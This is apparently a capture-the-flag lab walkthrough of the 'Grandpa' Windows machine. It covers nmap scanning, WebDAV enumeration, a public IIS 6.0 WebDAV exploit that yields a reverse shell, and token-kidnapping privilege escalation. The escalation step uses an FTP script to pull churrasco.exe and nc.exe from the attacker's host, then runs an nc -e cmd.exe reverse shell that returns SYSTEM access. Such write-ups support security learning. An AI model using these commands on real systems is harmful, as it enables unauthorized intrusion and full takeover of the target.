```
WINDOWS MACHINE
TARGET=10.10.10.14
```

# scanning
```
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/GRANDPA1]
└─$ cat nmap.txt        
# Nmap 7.94SVN scan initiated Fri Feb 16 20:41:01 2024 as: nmap -sC -sV -oN nmap.txt -vvv -p 80 10.10.10.14
Nmap scan report for 10.10.10.14
Host is up, received syn-ack (0.25s latency).
Scanned at 2024-02-16 20:41:02 EST for 13s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|_  Server Date: Sat, 17 Feb 2024 01:41:09 GMT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 16 20:41:15 2024 -- 1 IP address (1 host up) scanned in 13.70 seconds
```


# enumeration
```
port 80 (running a vulnerable microsoft webdav iis 6.0 )


**googling:**

more information about webdav:

Web Distributed Authoring and Versioning or WebDAV is a protocol whose basic functionality includes enabling users to share, copy, move and edit files through a web server

EXploits and vulnerability:
1. https://www.exploit-db.com/exploits/41738
2.  via metasploit (available)
3. https://github.com/eliuha/webdav_exploit
4. https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git (worked and was written in python2)

Exploit language used: paython2

Found a davtest tool which can be used to text webdav if is exploitable

googling:"davtest" is a tool commonly used for testing and exploiting WebDAV (Web Distributed Authoring and Versioning) services.

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/GRANDPA1]
└─$ davtest -url http://10.10.10.14/   
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.14
********************************************************
NOTE    Random string for this session: 3XMC_yaPsd
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     cfm     FAIL
PUT     html    FAIL
PUT     pl      FAIL
PUT     shtml   FAIL
PUT     jsp     FAIL
PUT     asp     FAIL
PUT     aspx    FAIL
PUT     jhtml   FAIL
PUT     cgi     FAIL
PUT     txt     FAIL
PUT     php     FAIL

********************************************************
/usr/bin/davtest Summary:


HOW THE EXPLOIT WORKS
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/GRANDPA1]
└─$ python2 exploit.py                       
usage:iis6webdav.py targetip targetport reverseip reverseport

```


# exploitation
```
From public exploits

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/GRANDPA1]
└─$ nc -nlvp 1234  
listening on [any] 1234 ...
connect to [10.10.14.82] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>

```

# FOOTHOLDING
```
NB: were limited in running command, such as powershell and other amongs

Number of useers we have in the system
1. Administrator
2. Harry


C:\Documents and Settings>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled      (we can use this to elevate to administrator)
SeCreateGlobalPrivilege       Create global objects                     Enabled 

```



# PRIVILEGE ESCALATION
```
NB: since powershell is disabled in here so we cant use it as the means of tramsferring files, we can try other options such as 
1. ftp (anonymuos login) - simple to use 
2. certutil
3. smbserver


lets go back to our impersonatePriv

This is privilege that is held by any process allows the impersonation (but not creation) of any token, given that a handle to it can be obtained. A privileged token can be acquired from a Windows service (DCOM) by inducing it to perform NTLM authentication against an exploit, subsequently enabling the execution of a process with SYSTEM privileges

They many means to exploit this one but most of them didn't work here course powershell and other command are disabled
1. juicepotato.exe (didn't work)
2. printspoofer (didn't work)
3. GodPotato (didn't work)
4. RogurePotato (didn't work also)
5. churrasco.exe and nc.exe worked here


NB: The reason behind why churrasco exploit worked is that the whole idea of the exploit is about token impersonate, so what churrasco binary tries to do is token kidnaping, so we can use this binary to kidnap the administrator token and help us to gain administrator privilege.


resource:
https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e



Requirements:
1. upload a churrasco.exe binary
2. upload a nc.exe binary to the target to a writtable location on the target machine
3. start the netcat listern to the local machine
4. execute the churrasco.exe binary

PoC: (we need the ftp.txt file with saved command that we can execute at once with ftp on the targeet machine during transfer)
command1:echo open 10.10.14.82 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET churrasco.exe >> ftp.txt&echo bye>> ftp.txt


command2:ftp -v -n -s:ftp.txt 

OUTPUT:
C:\wmpub>ftp -v -n -s:ftp.txt
ftp -v -n -s:ftp.txt
Connected to 10.10.14.82.
open 10.10.14.82 21
220 pyftpdlib 1.5.9 ready.
USER anonymous 
331 Username ok, send password.

230 Login successful.
bin
200 Type set to: Binary.
GET churrasco.exe 
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
ftp: 31232 bytes received in 0.27Seconds 117.41Kbytes/sec.
bye


We can repeart the same procedure with nc.exe

echo open 10.10.14.82 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET nc.exe >> ftp.txt&echo bye>> ftp.txt


command3: C:\wmpub>churrasco.exe -d "C:\wmpub\nc.exe 10.10.14.82 1234 -e cmd.exe"

OUTPUT:
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/GRANDPA1]
└─$ nc -nlvp 1234  
listening on [any] 1234 ...
connect to [10.10.14.82] from (UNKNOWN) [10.10.10.14] 1045
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system

C:\WINDOWS\TEMP>   


```